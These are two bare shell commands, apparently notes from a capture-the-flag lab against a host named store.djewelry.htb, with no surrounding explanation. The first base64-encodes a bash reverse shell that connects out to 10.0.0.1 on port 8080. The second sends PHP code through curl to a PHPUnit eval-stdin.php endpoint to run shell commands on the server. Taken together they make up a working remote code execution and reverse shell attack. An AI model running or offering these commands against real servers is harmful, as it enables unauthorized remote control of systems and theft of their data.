echo 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1' | base64
curl --data '<?php echo(shell_exec('cat Default.php'));' http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php

